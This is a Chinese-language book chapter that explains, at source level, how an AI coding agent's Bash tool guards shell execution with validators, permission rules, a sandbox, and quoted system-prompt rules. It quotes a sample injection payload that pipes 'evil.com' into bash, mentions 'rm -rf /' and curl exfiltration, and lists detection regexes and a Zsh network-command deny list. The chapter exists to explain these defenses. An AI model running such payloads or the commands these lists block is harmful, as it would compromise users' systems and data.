
# 第 9 章：Bash 工具 — 最强大也最危险的能力

> **核心问题**：如何在给 LLM 完整的 shell 执行能力的同时，防止它执行危险命令、泄露数据、或被 prompt injection 利用？

Bash 工具是 Claude Code 中最强大的工具 — 它赋予 LLM 执行任意 shell 命令的能力，等同于把一个终端交给了 AI。这种能力使 Claude Code 可以编译代码、运行测试、管理 git、安装依赖，几乎可以做开发者在终端中做的一切。

但这也是最危险的工具。一个不受限的 `rm -rf /`、一个偷偷发送数据到外部的 `curl`、一个通过 prompt injection 注入的恶意命令，都可能造成不可逆的损害。Claude Code 为此构建了多层防护：命令解析、安全验证、沙箱隔离、权限检查、输出控制。

本章将从源码层面完整解析这套防护体系。

---

## 9.1 BashTool 架构概览

### 文件结构

```
tools/BashTool/
├── BashTool.tsx              ← 主工具定义：inputSchema、call、渲染
├── prompt.ts                 ← System prompt 生成
├── toolName.ts               ← BASH_TOOL_NAME 常量
├── bashPermissions.ts        ← 核心权限检查逻辑 (bashToolHasPermission)
├── bashSecurity.ts           ← 安全验证器集合
├── commandSemantics.ts       ← 命令退出码语义解释
├── readOnlyValidation.ts     ← 只读命令识别
├── shouldUseSandbox.ts       ← 沙箱决策
├── pathValidation.ts         ← 路径安全验证
├── sedEditParser.ts          ← sed 编辑命令解析
├── sedValidation.ts          ← sed 安全约束
├── modeValidation.ts         ← 模式验证
├── destructiveCommandWarning.ts ← 破坏性命令警告
├── commentLabel.ts           ← 注释标签
├── bashCommandHelpers.ts     ← 命令操作符权限检查
└── utils.ts                  ← 输出格式化、图片处理
```

### 核心数据流

```
LLM 生成 tool_use: Bash({command: "npm test", timeout: 30000})
    │
    ▼
┌─────────────────────────────────────────────────┐
│                BashTool.call()                   │
├─────────────────────────────────────────────────┤
│                                                  │
│  ┌──────────────┐     ┌──────────────────┐      │
│  │ validateInput │ ──→ │ bashSecurity.ts   │      │
│  │              │     │ 20+ 安全验证器     │      │
│  └──────────────┘     └──────────────────┘      │
│         │ pass                                   │
│         ▼                                        │
│  ┌──────────────────┐                           │
│  │ checkPermissions  │                           │
│  │ bashPermissions.ts│                           │
│  │  ├── deny rules   │                           │
│  │  ├── allow rules  │                           │
│  │  ├── path check   │                           │
│  │  ├── sed check    │                           │
│  │  └── classifier   │                           │
│  └──────────┬───────┘                            │
│             │ allowed                             │
│             ▼                                     │
│  ┌──────────────────┐     ┌──────────────────┐   │
│  │ shouldUseSandbox  │ ──→ │ SandboxManager   │   │
│  │                  │     │ (sandbox-adapter) │   │
│  └──────────┬───────┘     └──────────────────┘   │
│             │                                     │
│             ▼                                     │
│  ┌──────────────────┐                            │
│  │ exec() 执行命令   │                            │
│  │ (utils/Shell.ts)  │                            │
│  └──────────┬───────┘                            │
│             │                                     │
│             ▼                                     │
│  ┌──────────────────┐                            │
│  │ 结果处理           │                            │
│  │  ├── 输出截断      │                            │
│  │  ├── 退出码语义    │                            │
│  │  ├── CWD 重置     │                            │
│  │  └── 图片检测      │                            │
│  └──────────────────┘                            │
│                                                   │
└─────────────────────────────────────────────────┘
```

---

## 9.2 Input Schema 与核心参数

### inputSchema 定义

```typescript
// BashTool.tsx — inputSchema（简化）
const inputSchema = z.strictObject({
  command: z.string()
    .describe('The bash command to execute'),
  timeout: semanticNumber(z.number().optional())
    .describe(`Optional timeout in milliseconds (max ${getMaxTimeoutMs()}ms)`),
  description: z.string().optional()
    .describe('Clear description of what this command does'),
  run_in_background: semanticBoolean(z.boolean().optional())
    .describe("Set to true to run in the background"),
  dangerouslyDisableSandbox: semanticBoolean(z.boolean().optional())
    .describe("Override sandbox mode"),
})
```

关键参数：

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `command` | string | 必填 | 要执行的命令 |
| `timeout` | number | 120000ms | 超时时间，最大 600000ms |
| `description` | string | - | 命令描述（帮助人类理解） |
| `run_in_background` | boolean | false | 后台执行 |
| `dangerouslyDisableSandbox` | boolean | false | 绕过沙箱 |

### 超时控制

```typescript
// src/tools/BashTool/prompt.ts
export function getDefaultTimeoutMs(): number {
  return getDefaultBashTimeoutMs()  // 默认 120000ms = 2分钟
}

export function getMaxTimeoutMs(): number {
  return getMaxBashTimeoutMs()  // 最大 600000ms = 10分钟
}
```

---

## 9.3 安全验证器链

### bashSecurity.ts：20+ 验证器

`bashSecurity.ts` 是 Claude Code 中最复杂的安全模块之一，包含 20 多个独立的验证器。每个验证器检查一种特定的攻击向量：

```typescript
// bashSecurity.ts — 安全检查 ID 枚举
const BASH_SECURITY_CHECK_IDS = {
  INCOMPLETE_COMMANDS: 1,           // 不完整的命令片段
  JQ_SYSTEM_FUNCTION: 2,           // jq 的 system() 函数
  JQ_FILE_ARGUMENTS: 3,            // jq 的文件参数
  OBFUSCATED_FLAGS: 4,             // 混淆的命令行参数
  SHELL_METACHARACTERS: 5,         // Shell 元字符
  DANGEROUS_VARIABLES: 6,          // 危险的环境变量
  NEWLINES: 7,                     // 命令中的换行符
  DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION: 8,  // $() 命令替换
  DANGEROUS_PATTERNS_INPUT_REDIRECTION: 9,     // 输入重定向
  DANGEROUS_PATTERNS_OUTPUT_REDIRECTION: 10,   // 输出重定向
  IFS_INJECTION: 11,               // IFS 变量注入
  GIT_COMMIT_SUBSTITUTION: 12,     // Git commit 中的替换
  PROC_ENVIRON_ACCESS: 13,         // /proc/environ 访问
  MALFORMED_TOKEN_INJECTION: 14,   // 畸形 token 注入
  BACKSLASH_ESCAPED_WHITESPACE: 15,// 反斜杠转义空白
  BRACE_EXPANSION: 16,             // 大括号展开
  CONTROL_CHARACTERS: 17,          // 控制字符
  UNICODE_WHITESPACE: 18,          // Unicode 空白
  MID_WORD_HASH: 19,               // 词中 # 号
  ZSH_DANGEROUS_COMMANDS: 20,      // Zsh 危险命令
  BACKSLASH_ESCAPED_OPERATORS: 21, // 转义的操作符
  COMMENT_QUOTE_DESYNC: 22,        // 注释/引号失同步
  QUOTED_NEWLINE: 23,              // 引号内换行
}
```

### 命令替换防护

最关键的安全检查之一是防止命令替换（command substitution）绕过权限：

```typescript
// bashSecurity.ts — 命令替换模式
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/,   message: 'process substitution <()' },
  { pattern: />\(/,   message: 'process substitution >()' },
  { pattern: /=\(/,   message: 'Zsh process substitution =()' },
  { pattern: /\$\(/,  message: '$() command substitution' },
  { pattern: /\$\{/,  message: '${} parameter substitution' },
  { pattern: /\$\[/,  message: '$[] legacy arithmetic expansion' },
  { pattern: /~\[/,   message: 'Zsh-style parameter expansion' },
  { pattern: /\(e:/,  message: 'Zsh-style glob qualifiers' },
  { pattern: /\(\+/,  message: 'Zsh glob qualifier with command execution' },
  { pattern: /\}\s*always\s*\{/, message: 'Zsh always block' },
  { pattern: /<#/,    message: 'PowerShell comment syntax' },
]
```

> **设计决策**：为什么要阻止 `$()`？考虑这个场景：用户允许了 `git commit -m "$(cat <<'EOF'..."` 这个模式。如果不检测 `$()`，攻击者可以构造 `git commit -m "$(curl evil.com | bash)"` 来执行任意命令。每个 `$()` 内部都是一个完整的子 shell。

### Zsh 危险命令防护

```typescript
// bashSecurity.ts — Zsh 特有的危险命令
const ZSH_DANGEROUS_COMMANDS = new Set([
  'zmodload',    // 加载任意模块（文件 IO、网络、进程控制）
  'emulate',     // emulate -c 是 eval 等价物
  'sysopen',     // 文件系统操作（zsh/system）
  'sysread', 'syswrite', 'sysseek',  // 底层 IO
  'zpty',        // 伪终端命令执行
  'ztcp',        // TCP 连接（数据外泄）
  'zsocket',     // Unix/TCP socket
  'zf_rm', 'zf_mv', 'zf_ln',  // 内置文件操作
  'zf_chmod', 'zf_chown',      // 权限修改
])
```

### 引号内容提取

安全检查的基础是正确解析引号。`extractQuotedContent()` 将命令拆分为：

```typescript
function extractQuotedContent(command: string): QuoteExtraction {
  let withDoubleQuotes = ''      // 仅去除单引号内容
  let fullyUnquoted = ''          // 去除所有引号内容
  let unquotedKeepQuoteChars = '' // 去除内容但保留引号字符
  // ... 逐字符解析，处理转义序列
}
```

这产生三个视图，供不同的验证器使用：
- `withDoubleQuotes`：检查双引号中可能的变量展开
- `fullyUnquoted`：检查非引号区域的危险模式
- `unquotedKeepQuoteChars`：检查引号边界的特殊模式（如 `'x'#`）

### 安全的 Heredoc 模式

有一种常见的安全使用模式 — 用 heredoc 传递多行内容给命令：

```bash
git commit -m "$(cat <<'EOF'
Commit message here.
EOF
)"
```

`isSafeHeredoc()` 精确验证这个模式的安全性：

```typescript
function isSafeHeredoc(command: string): boolean {
  // 要求：
  // 1. delimiter 必须用单引号（'EOF'）或反斜杠（\EOF）阻止展开
  // 2. 关闭 delimiter 必须独占一行
  // 3. $() 前必须有非空白内容（不能作为命令名）
  // 4. 去除 heredoc 后的剩余部分必须通过所有验证器
}
```

> **设计决策**：Heredoc 验证使用**行级匹配**而非正则的 `[\s\S]*?`。Bash 的 heredoc 关闭行为是"第一个匹配的行"，而 `[\s\S]*?` 可能跳过第一个 delimiter 找到后面的，隐藏了两个 delimiter 之间的注入命令。

---

## 9.4 权限检查：bashToolHasPermission

### 权限检查主流程

`bashPermissions.ts` 中的 `bashToolHasPermission()` 是 Bash 工具的核心权限判断函数，逻辑极其复杂（源码超过 500 行）。其主要流程：

```
bashToolHasPermission(command)
    │
    ├── 1. 检查权限模式 (checkPermissionMode)
    │     └── 'bypassPermissions' 模式直接允许
    │
    ├── 2. 分割复合命令 (splitCommand)
    │     └── "git add . && git commit" → ["git add .", "git commit"]
    │     └── 超过 MAX_SUBCOMMANDS_FOR_SECURITY_CHECK (50) 则 ask
    │
    ├── 3. 对每个子命令：
    │     │
    │     ├── a. bashSecurity 安全检查
    │     │     └── 20+ 验证器链
    │     │
    │     ├── b. deny rules 匹配
    │     │     └── "Bash(rm:*)" → 匹配 rm 开头的命令
    │     │
    │     ├── c. allow rules 匹配
    │     │     └── "Bash(git *)" → 匹配 git 开头的命令
    │     │
    │     ├── d. 只读命令快速通道
    │     │     └── checkReadOnlyConstraints()
    │     │
    │     ├── e. 路径约束检查
    │     │     └── checkPathConstraints()
    │     │
    │     ├── f. sed 特殊处理
    │     │     └── checkSedConstraints()
    │     │
    │     └── g. classifier（Bash 分类器）
    │           └── 基于描述的动态安全分类
    │
    └── 4. 汇总所有子命令的结果
          └── 任一 deny → deny
          └── 任一 ask → ask（带建议规则）
          └── 全部 allow → allow
```

### 规则匹配：三种模式

权限规则支持三种匹配模式：

```typescript
// bashPermissions.ts — 规则解析
type ShellPermissionRule =
  | { type: 'exact'; command: string }    // 精确匹配
  | { type: 'prefix'; prefix: string }    // 前缀匹配（含 :*）
  | { type: 'wildcard'; pattern: string } // 通配符匹配

// 示例规则：
// "git commit"        → exact: 只匹配 "git commit"
// "git:*"             → prefix: 匹配 "git" 开头的所有命令
// "npm run *"         → wildcard: 匹配 "npm run" 后跟任意内容
```

### 复合命令处理

复合命令的安全上限：

```typescript
// bashPermissions.ts
export const MAX_SUBCOMMANDS_FOR_SECURITY_CHECK = 50
export const MAX_SUGGESTED_RULES_FOR_COMPOUND = 5
```

超过 50 个子命令时直接回退到 'ask'，防止恶意构造的超长命令链导致安全检查资源耗尽。

---

## 9.5 只读命令识别

### readOnlyValidation.ts

只读命令可以跳过权限确认。`checkReadOnlyConstraints()` 维护了一套详尽的命令白名单：

```typescript
// 从 readOnlyValidation.ts 引用的只读命令集
import {
  GIT_READ_ONLY_COMMANDS,       // git status, git log, git diff...
  GH_READ_ONLY_COMMANDS,        // gh pr view, gh issue list...
  DOCKER_READ_ONLY_COMMANDS,    // docker ps, docker images...
  RIPGREP_READ_ONLY_COMMANDS,   // rg --files, rg pattern...
  PYRIGHT_READ_ONLY_COMMANDS,   // pyright --verifytypes...
  EXTERNAL_READONLY_COMMANDS,   // ls, cat, head, file, which...
} from '../../utils/shell/readOnlyCommandValidation.js'
```

每个命令集不仅检查命令名，还验证参数标志的安全性：

```typescript
type CommandConfig = {
  safeFlags: Record<string, FlagArgType>  // 允许的标志及其参数类型
  regex?: RegExp                           // 额外正则验证
  additionalCommandIsDangerousCallback?: (cmd, args) => boolean
  respectsDoubleDash?: boolean             // 是否遵循 -- 分隔符
}
```

### 命令语义解释

不同命令的退出码含义不同。`commandSemantics.ts` 提供了语义化解释：

```typescript
// commandSemantics.ts
const COMMAND_SEMANTICS: Map<string, CommandSemantic> = new Map([
  // grep: 0=有匹配, 1=无匹配（不是错误）, 2+=真正的错误
  ['grep', (exitCode) => ({
    isError: exitCode >= 2,
    message: exitCode === 1 ? 'No matches found' : undefined,
  })],

  // diff: 0=无差异, 1=有差异（不是错误）, 2+=错误
  ['diff', (exitCode) => ({
    isError: exitCode >= 2,
    message: exitCode === 1 ? 'Files differ' : undefined,
  })],

  // find: 0=成功, 1=部分成功, 2+=错误
  ['find', (exitCode) => ({
    isError: exitCode >= 2,
    message: exitCode === 1 ? 'Some directories were inaccessible' : undefined,
  })],
])
```

> **设计决策**：`grep` 返回 1 时（无匹配）不标记为错误。这避免了 LLM 看到 "Command failed with exit code 1" 后误以为命令出错而重试。

---

## 9.6 沙箱系统

### shouldUseSandbox 决策

```typescript
// shouldUseSandbox.ts
export function shouldUseSandbox(input: Partial<SandboxInput>): boolean {
  if (!SandboxManager.isSandboxingEnabled()) {
    return false
  }
  // 显式关闭 + 策略允许关闭
  if (input.dangerouslyDisableSandbox &&
      SandboxManager.areUnsandboxedCommandsAllowed()) {
    return false
  }
  if (!input.command) {
    return false
  }
  // 排除命令检查（用户配置的排除列表）
  if (containsExcludedCommand(input.command)) {
    return false
  }
  return true
}
```

### 排除命令检查

用户可以配置某些命令不经过沙箱：

```typescript
function containsExcludedCommand(command: string): boolean {
  // 分割复合命令，每个子命令单独检查
  const subcommands = splitCommand_DEPRECATED(command)

  for (const subcommand of subcommands) {
    // 迭代去除环境变量前缀和包装命令
    // "timeout 300 FOO=bar bazel run" → "bazel run"
    const candidates = [trimmed]
    // ... 固定点迭代，同时尝试 stripAllLeadingEnvVars 和 stripSafeWrappers

    for (const pattern of userExcludedCommands) {
      const rule = bashPermissionRule(pattern)
      // 支持 exact / prefix / wildcard 三种匹配
    }
  }
}
```

### 沙箱配置在 Prompt 中的体现

沙箱的文件系统和网络限制会被注入到 system prompt 中，让 LLM 了解约束：

```typescript
function getSimpleSandboxSection(): string {
  const filesystemConfig = {
    read: { denyOnly: [...] },
    write: { allowOnly: [...], denyWithinAllow: [...] },
  }
  const networkConfig = {
    allowedHosts: [...],
    deniedHosts: [...],
  }
  // 生成说明文本...
}
```

---

## 9.7 命令执行与输出处理

### Shell 执行

BashTool 的 `call()` 方法通过异步生成器执行命令：

```typescript
// BashTool.tsx — call() 核心（简化）
async call(input, toolUseContext, _canUseTool, parentMessage, onProgress) {
  const commandGenerator = runShellCommand({
    input,
    abortController,
    setAppState,
    preventCwdChanges: !isMainThread,
    isMainThread,
  })

  let generatorResult
  do {
    generatorResult = await commandGenerator.next()
    if (!generatorResult.done && onProgress) {
      onProgress({
        toolUseID: `bash-progress-${progressCounter++}`,
        data: {
          type: 'bash_progress',
          output: progress.output,
          elapsedTimeSeconds: progress.elapsedTimeSeconds,
          totalLines: progress.totalLines,
        }
      })
    }
  } while (!generatorResult.done)
}
```

### 输出截断

大量输出会被截断以避免 context 溢出：

```typescript
// BashTool/utils.ts
export function formatOutput(content: string): {
  totalLines: number
  truncatedContent: string
  isImage?: boolean
} {
  const maxOutputLength = getMaxOutputLength()
  if (content.length <= maxOutputLength) {
    return { totalLines, truncatedContent: content }
  }

  const truncatedPart = content.slice(0, maxOutputLength)
  const remainingLines = countCharInString(content, '\n', maxOutputLength) + 1
  const truncated = `${truncatedPart}\n\n... [${remainingLines} lines truncated] ...`

  return { totalLines, truncatedContent: truncated }
}
```

### 图片输出检测

Bash 命令可以输出 base64 图片（如 matplotlib 生成的图表），系统会自动检测和处理：

```typescript
export function isImageOutput(content: string): boolean {
  return /^data:image\/[a-z0-9.+_-]+;base64,/i.test(content)
}

// 超过 20MB 的图片输出被拒绝
const MAX_IMAGE_FILE_SIZE = 20 * 1024 * 1024
```

### CWD 重置

如果 bash 命令改变了工作目录到项目外部，系统会自动重置：

```typescript
export function resetCwdIfOutsideProject(
  toolPermissionContext: ToolPermissionContext,
): boolean {
  const cwd = getCwd()
  const originalCwd = getOriginalCwd()
  if (cwd !== originalCwd &&
      !pathInAllowedWorkingPath(cwd, toolPermissionContext)) {
    setCwd(originalCwd)
    return true
  }
  return false
}
```

---

## 9.8 搜索/读取命令分类

### isSearchOrReadBashCommand

Bash 命令被分类用于 UI 折叠显示：

```typescript
// BashTool.tsx
const BASH_SEARCH_COMMANDS = new Set([
  'find', 'grep', 'rg', 'ag', 'ack', 'locate', 'which', 'whereis'
])

const BASH_READ_COMMANDS = new Set([
  'cat', 'head', 'tail', 'less', 'more',
  'wc', 'stat', 'file', 'strings',
  'jq', 'awk', 'cut', 'sort', 'uniq', 'tr'
])

const BASH_LIST_COMMANDS = new Set([
  'ls', 'tree', 'du'
])

// 语义中性命令 — 不影响管道的搜索/读取性质
const BASH_SEMANTIC_NEUTRAL_COMMANDS = new Set([
  'echo', 'printf', 'true', 'false', ':'
])
```

管道中的分类规则：**所有部分都必须是搜索/读取命令，整个命令才算搜索/读取**。但语义中性命令被跳过不计：

```typescript
// "ls dir && echo '---' && ls dir2" → 仍然是 list 操作
// "cat file | grep pattern"         → 是 search 操作
// "cat file | rm -f"                → 不是只读操作
```

---

## 9.9 后台执行

### run_in_background 机制

当 `run_in_background: true` 时，命令在后台执行，完成后通过通知回调告知 LLM：

```typescript
// BashTool.tsx
const ASSISTANT_BLOCKING_BUDGET_MS = 15_000 // 助理模式阻塞预算
```

后台任务通过 `LocalShellTask` 管理：

```typescript
import {
  backgroundExistingForegroundTask,
  markTaskNotified,
  registerForeground,
  spawnShellTask,
  unregisterForeground
} from '../../tasks/LocalShellTask/LocalShellTask.js'
```

### 进度报告

长时间运行的命令通过进度回调流式报告：

```typescript
const PROGRESS_THRESHOLD_MS = 2000  // 2秒后开始显示进度

// 进度数据结构
type BashProgress = {
  type: 'bash_progress'
  output: string              // 最近输出
  fullOutput: string           // 累积输出
  elapsedTimeSeconds: number   // 经过时间
  totalLines: number           // 总行数
  totalBytes: number           // 总字节数
  taskId?: string              // 后台任务 ID
}
```

---

## 9.10 Prompt 工程：引导 LLM 正确使用

### 工具偏好引导

Bash 的 prompt 主动引导 LLM 使用专用工具而非 Bash 命令行等价物：

```
IMPORTANT: Avoid using this tool to run `find`, `grep`, `cat`,
`head`, `tail`, `sed`, `awk`, or `echo` commands...

 - File search: Use Glob (NOT find or ls)
 - Content search: Use Grep (NOT grep or rg)
 - Read files: Use Read (NOT cat/head/tail)
 - Edit files: Use Edit (NOT sed/awk)
 - Write files: Use Write (NOT echo >/cat <<EOF)
 - Communication: Output text directly (NOT echo/printf)
```

> **设计决策**：为什么不直接禁止这些命令？因为有些场景下 Bash 更合适（如用户明确要求、管道组合、专用工具无法覆盖的情况）。提示是建议而非强制，保留了灵活性。

### Git 安全协议

Prompt 中包含详细的 Git 操作指南：

```
Git Safety Protocol:
- NEVER update the git config
- NEVER run destructive git commands (push --force, reset --hard,
  checkout ., restore ., clean -f, branch -D) unless explicitly requested
- NEVER skip hooks (--no-verify, --no-gpg-sign, etc)
- NEVER run force push to main/master
- CRITICAL: Always create NEW commits rather than amending
- When staging files, prefer adding specific files by name
- NEVER commit changes unless the user explicitly asks
```

### sleep 限制

```
Avoid unnecessary `sleep` commands:
- Do not sleep between commands that can run immediately
- If your command is long running — use `run_in_background`
- Do not retry failing commands in a sleep loop
- If waiting for a background task, you will be notified
```

---

## 9.11 sed 编辑的特殊处理

### sed 命令解析

Claude Code 对 `sed` 编辑命令有特殊处理 — 将 sed 解析为 Edit 操作：

```typescript
// sedEditParser.ts
export function parseSedEditCommand(command: string): SedEdit | null {
  // 解析 sed -i 's/old/new/g' file
  // 转换为等价的 FileEdit 操作
}
```

### sed 安全约束

```typescript
// sedValidation.ts — checkSedConstraints
// 验证 sed 命令是否只包含安全的替换操作
// 防止 sed 的 'e' 标志（执行模式空间内容作为命令）
// 防止 sed 的 'w' 标志（写入到文件）
```

---

## 章末速查表

| 概念 | 定义位置 | 说明 |
|------|---------|------|
| `BashTool` | `tools/BashTool/BashTool.tsx` | 主工具定义和 call 实现 |
| `BASH_TOOL_NAME` | `tools/BashTool/toolName.ts` | 工具名常量 |
| `bashToolHasPermission` | `bashPermissions.ts` | 核心权限检查 |
| `bashCommandIsSafe_DEPRECATED` | `bashSecurity.ts` | 安全验证器链 |
| `BASH_SECURITY_CHECK_IDS` | `bashSecurity.ts` | 安全检查编号 |
| `COMMAND_SUBSTITUTION_PATTERNS` | `bashSecurity.ts` | 命令替换模式 |
| `ZSH_DANGEROUS_COMMANDS` | `bashSecurity.ts` | Zsh 危险命令集 |
| `checkReadOnlyConstraints` | `readOnlyValidation.ts` | 只读命令判断 |
| `shouldUseSandbox` | `shouldUseSandbox.ts` | 沙箱决策 |
| `interpretCommandResult` | `commandSemantics.ts` | 退出码语义 |
| `formatOutput` | `utils.ts` | 输出截断 |
| `MAX_SUBCOMMANDS_FOR_SECURITY_CHECK` | `bashPermissions.ts` | 子命令数量上限 (50) |
| `PROGRESS_THRESHOLD_MS` | `BashTool.tsx` | 进度显示阈值 (2000ms) |
| `getDefaultTimeoutMs` | `prompt.ts` | 默认超时 (120000ms) |
| `getMaxTimeoutMs` | `prompt.ts` | 最大超时 (600000ms) |
